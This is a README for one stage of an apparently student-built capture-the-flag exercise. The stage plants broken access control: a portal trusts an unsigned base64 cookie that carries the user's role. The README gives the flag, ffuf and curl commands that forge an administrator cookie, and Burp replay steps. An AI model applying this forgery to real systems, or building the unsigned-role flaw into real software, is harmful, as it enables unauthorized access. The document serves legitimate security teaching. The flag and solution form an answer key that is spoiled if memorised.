# Stage 3 — The Back Door (Web Security)

**Owner:** IT24103666 (Challenge Design A)
**Flag:** `RTR{back-door_access-granted}`
**Target:** `https://vault-03.rtr.local` (via the reverse proxy)

## Build and run

```bash
docker compose up -d --build        # control plane must be up first
```

The container joins the externally-created `stage3-net` and publishes no
ports. It is reachable only through Nginx, which routes by `server_name`.

## The planted vulnerability

OWASP A01:2021 Broken Access Control.

On first visit the portal issues a session cookie:

```
nxb_session = base64({"user":"guest","role":"viewer","portal":"VAULT-03"})
```

The role travels to the client as plain base64 with **no signature and no
server-side session store**. `/internal` reads that role straight back off the
request and believes it. Anything the client sends is trusted.

## Discovery paths

Both work, by design:

1. **Client-side source** — `/static/js/portal.js` carries a commented-out
   `fetch("/internal")` with a TODO explaining the route was never
   decommissioned.
2. **Directory enumeration** — `robots.txt` disallows `/internal`, and the
   path appears in common wordlists (ffuf, gobuster, dirsearch).

## The 403 is deliberate

```json
{
  "error": "insufficient role",
  "required_role": "administrator",
  "your_role": "viewer"
}
```

The rejection names the role it wants and the role you have. That is the
teachable moment: the server is describing its own check, and the check reads
client data.

## Outputs consumed downstream

| Output | Consumed by |
|---|---|
| `X-Cipher-Hint: repeating-key-xor` | Stage 4 — names the cipher family |
| `vault_backup.enc` (234 bytes) | Stage 4 — the ciphertext |

`app/static/vault_backup.enc` is produced by `../stage4-crypto/generate.py`.
If that file is regenerated, copy it here again.

## Exploit

`solve.py` automates the whole path. Member 2's LO3 deliverable.

```bash
pip install requests
python3 solve.py https://vault-03.rtr.local
```

Verified output: HTTP 403 on the viewer session, HTTP 200 after forging
`"role":"administrator"`, flag and cipher hint recovered, file downloaded with
SHA-256 `5966c099ea2ab0838a6ded1212f2b1d9178b0521723f6c8f97a868d3a2a4c7ce`.

## Manual solve (for the video)

```bash
# 1. enumerate
ffuf -u https://vault-03.rtr.local/FUZZ -w /usr/share/wordlists/dirb/common.txt -k

# 2. probe with the issued session
curl -k https://vault-03.rtr.local/internal -b "nxb_session=<issued>"

# 3. forge and re-request
echo -n '{"user":"guest","role":"administrator","portal":"VAULT-03"}' | base64 -w0
curl -ki https://vault-03.rtr.local/internal -b "nxb_session=<forged>"
```

Burp Suite works equally well: intercept, decode the cookie in the Decoder
tab, change `viewer` to `administrator`, re-encode and replay.

## Container hardening

Unprivileged user, all capabilities dropped, `no-new-privileges`, read-only
root filesystem with a tmpfs for `/tmp`, 512 MB / 0.5 CPU limits, no host
volume mounts. The challenge is a web authorization flaw — the container
itself is not meant to be escapable.

## Reset

```bash
../scripts/reset.sh stage3
```

The app holds no persistent state and mounts no volumes, so a restart restores
it fully. Use `--force-recreate --build` if image integrity is in doubt.
